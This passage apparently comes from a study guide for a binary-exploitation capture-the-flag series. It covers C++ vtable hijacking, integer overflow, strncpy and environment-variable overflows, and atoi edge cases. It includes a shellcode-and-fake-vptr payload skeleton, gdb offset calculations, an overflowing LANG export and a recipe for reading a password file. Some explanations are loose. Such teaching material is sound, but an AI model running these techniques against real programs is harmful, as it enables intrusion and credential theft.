
3. vtable Hijacking
The Vulnerability:
cppclass N {
    int value;
    char annotation[100];  // Buffer!
public:
    void setAnnotation(char *str) {
        memcpy(annotation, str, strlen(str));  // No bounds check!
    }
    
    virtual int operator+(N &other);
};

int main(int argc, char **argv) {
    N *obj1 = new N(5);
    N *obj2 = new N(6);
    
    obj1->setAnnotation(argv[1]);  // Overflow here!
    
    (*obj2) + (*obj1);  // Calls virtual function!
}
Heap Layout:
+------------------+
| obj1->vptr       | ← Points to real vtable
+------------------+
| obj1->value      |
+------------------+
| obj1->annotation | ← Buffer starts here
| (100 bytes)      |   Can overflow!
+------------------+
| obj2->vptr       | ← We can overwrite this!
+------------------+
| obj2->value      |
+------------------+
| obj2->annotation |
+------------------+
Exploitation Strategy:
1. Overflow obj1->annotation buffer
2. Overwrite obj2->vptr
3. Point vptr to fake vtable (our shellcode)
4. When virtual function called on obj2, executes our code!
Payload Structure:
python# Shellcode (fake vtable)
shellcode = "\x31\xc0\x50..."  # execve /bin/sh

# Padding to reach obj2->vptr
padding = "A" * (distance_to_obj2_vptr - len(shellcode))

# Address of shellcode (will be in obj1)
shellcode_addr = obj1_addr + offset_to_shellcode

# Fake vptr pointing to shellcode
fake_vptr = struct.pack('<I', shellcode_addr)

payload = shellcode + padding + fake_vptr
Learn More:

📖 vtable Exploitation ⭐ EXCELLENT
📖 C++ Exploitation
🎥 YouTube: vtable Hijacking

4. C++ Operators Overloading
What is it?
Defining custom behavior for operators (+, -, *, etc.)
Example:
cppclass Number {
    int val;
public:
    Number(int v) : val(v) { }
    
    // Overload + operator
    int operator+(Number &other) {
        return this->val + other.val;
    }
};

// Usage:
Number a(5);
Number b(3);
int result = a + b;  // Calls a.operator+(b)
Virtual Operator:
cppclass N {
public:
    virtual int operator+(N &other) {
        return value + other.value;
    }
};

// This creates a vtable entry!
In Memory:
vtable for N:
+------------------+
| operator+()      | ← vtable[0]
+------------------+

When you do: obj2 + obj1
1. Loads obj2->vptr
2. Loads vtable[0]
3. Calls operator+()

If we control vptr, we control what gets called!
Learn More:

📖 Operator Overloading
📖 C++ Operators Reference

5. Calculating Object Offsets
Finding Distances:
bashgdb ./level9
(gdb) break main
(gdb) run test
(gdb) x/20wx obj1
0x804a008: vtable_ptr, value, annotation...

(gdb) x/20wx obj2
0x804a078: vtable_ptr, value, annotation...

# Distance: 0x804a078 - 0x804a008 = 0x70 = 112 bytes
Calculating Overflow:
python# Object 1 layout:
# 0-3:   vptr (4 bytes)
# 4-7:   value (4 bytes)  
# 8-107: annotation (100 bytes)

# Object 2 starts at: obj1 + 112
# obj2's vptr is at: obj1 + 112

# To overflow from annotation to obj2's vptr:
# annotation starts at offset 8
# obj2's vptr at offset 112
# Need to write: 112 - 8 = 104 bytes

payload = shellcode
payload += "A" * (104 - len(shellcode))
payload += fake_vptr_pointing_to_shellcode
Learn More:

📖 C++ Object Size
🛠️ Tool: pahole - shows structure layout


Bonus Levels
Bonus 0 - Multiple strcpy Overflow
Concepts:
1. Multiple String Operations
cchar buffer1[20];
char buffer2[20];
char dest[40];

read(0, buffer1, 4096);  // Can overflow buffer1!
read(0, buffer2, 4096);  // Can overflow buffer2!
strcpy(dest, buffer1);   // Copies buffer1
strcat(dest, buffer2);   // Appends buffer2
2. Stack Layout with Multiple Buffers
+------------------+
| Return Address   |
+------------------+
| Saved EBP        |
+------------------+
| dest[40]         |
+------------------+
| buffer2[20]      |
+------------------+
| buffer1[20]      |
+------------------+
Exploitation:

Overflow buffer1 into buffer2
Control dest through concatenation
Overwrite return address

Learn More:

📖 String Function Vulnerabilities

Bonus 1 - Integer Overflow
Concepts:
1. Integer Overflow
cint len = atoi(argv[1]);  // User input
if (len < 10) {
    memcpy(buffer, argv[2], len * 4);  // len*4 can overflow!
}
The Vulnerability:
python# If len = -1:
# -1 < 10 (passes check!)
# -1 * 4 = -4 in signed int
# But memcpy interprets as unsigned!
# -4 as unsigned = 4294967292 (huge number!)
# Copies massive amount → buffer overflow!
Example:
c// Check
if (len < 10)  // -2147483648 < 10 ✓

// But in multiplication:
len * 4
= -2147483648 * 4
= -8589934592
= (wrapped) 0x00000000  // Or huge unsigned value!
Learn More:

📖 Integer Overflow Explained ⭐
📖 Integer Security
🎥 YouTube: Integer Overflow

2. Signed vs Unsigned
csigned int x = -1;
unsigned int y = x;  // y = 4294967295 (0xFFFFFFFF)

printf("%d\n", x);  // -1
printf("%u\n", y);  // 4294967295
Learn More:

📖 Signed vs Unsigned

Bonus 2 - Environment + strncpy
Concepts:
1. strncpy() Quirks
cchar dest[10];
strncpy(dest, source, 10);

// PROBLEM 1: Doesn't always null-terminate!
// If source >= 10 chars, dest has NO null byte!

// PROBLEM 2: Still vulnerable if used wrong
char buf[20];
strncpy(buf, user_input, 40);  // Copies 40 bytes into 20-byte buffer!
Dangerous Pattern:
cchar buffer[40];
char lang[40];

// Gets LANG environment variable
strncpy(lang, getenv("LANG"), 40);  // No null termination!

// Later concatenates
strcat(buffer, lang);  // buffer overflow if lang not null-terminated!
Learn More:

📖 strncpy Pitfalls ⭐
📖 String Functions Security
🎥 YouTube: strncpy Issues

2. Environment Variable Manipulation
bash# Set environment variable
export LANG="en_US.UTF-8"

# In C, read it:
char *lang = getenv("LANG");

# Exploit: Set malicious value
export LANG=$(python -c 'print "A"*100')
./bonus2
Why it's dangerous:

Environment vars are user-controlled
Often trusted by programs
Can be very long
Stored on stack (high addresses)

Learn More:

📖 Environment Variable Attacks

3. Locale String Exploitation
c// Program reads LANG
char *lang = getenv("LANG");
if (lang[0] == 'f' && lang[1] == 'i') {
    // Finnish
}
else if (lang[0] == 'n' && lang[1] == 'l') {
    // Dutch  
}

// Copies based on language
strncpy(buffer, user_input, len);
Exploitation:

Set LANG to specific value
Control buffer length calculation
Cause overflow through combination of inputs

Learn More:

📖 Locale Vulnerabilities

Bonus 3 - atoi() Edge Cases
Concepts:
1. atoi() Return Values
catoi("123")     // Returns: 123
atoi("-456")    // Returns: -456
atoi("abc")     // Returns: 0
atoi("")        // Returns: 0  ← Important!
atoi("  42")    // Returns: 42 (skips whitespace)
atoi("42abc")   // Returns: 42 (stops at non-digit)
The Vulnerability:
cchar buffer[64];
int index = atoi(user_input);

// Read from file using index
fread(buffer, 1, 64, files[index]);

// If user_input is "", index = 0
// files[0] might contain sensitive data!
Exploitation:
bash# Normal: provide valid index
./bonus3 1

# Exploit: provide empty string
./bonus3 ""

# atoi("") returns 0
# Accesses files[0] which might be password file!
Learn More:

📖 atoi() Behavior ⭐
📖 Input Validation Failures
🎥 YouTube: atoi Security

2. File Descriptor Array
cFILE *files[3];
files[0] = fopen("/home/user/bonus3/.pass", "r");  // Password!
files[1] = fopen("/tmp/file1", "r");
files[2] = fopen("/tmp/file2", "r");

int index = atoi(argv[1]);
fread(buffer, 1, 64, files[index]);

// If index = 0, reads password file!
Why it works:

Array indices start at 0
files[0] contains password file
atoi("") returns 0
Program doesn't expect index 0

Learn More:

📖 Array Indexing Vulnerabilities

